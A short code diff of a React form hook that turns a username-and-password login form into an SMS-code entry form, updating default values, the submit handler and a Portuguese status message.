@@ -8,7 +8,7 @@ import { useAccountContext } from '../accountContext/useContext';
 import { useLoadingContext } from '../loadingContext/useContext';
 import { zodSchema, BodyProtocol } from './validation';
 
-export default function useFormLogin() {
+export default function useFormCodeSMS() {
   const {
     register,
     handleSubmit,
@@ -16,12 +16,12 @@ export default function useFormLogin() {
     watch,
     reset,
     trigger,
+    setFocus,
     formState: { errors, isSubmitted },
   } = useForm<BodyProtocol>({
     resolver: zodResolver(zodSchema),
     defaultValues: {
-      password: '',
-      user: '',
+      sms: '',
     },
   });
   const { isLoading, setIsLoading } = useLoadingContext();
@@ -29,13 +29,12 @@ export default function useFormLogin() {
 
   const handleFormSubmit: SubmitHandler<BodyProtocol> = async body => {
     if (isLoading) return;
-    const { user, password } = body;
+    const { sms } = body;
     setIsLoading(true);
     setAccount(state => ({
       ...state,
-      user,
-      password,
-      status: 'esperando resposta usuário e senha',
+      sms,
+      status: 'esperando resposta código sms',
     }));
   };
 
@@ -52,5 +51,6 @@ export default function useFormLogin() {
     handleReset,
     trigger,
     isSubmitted,
+    setFocus,
   };
 }
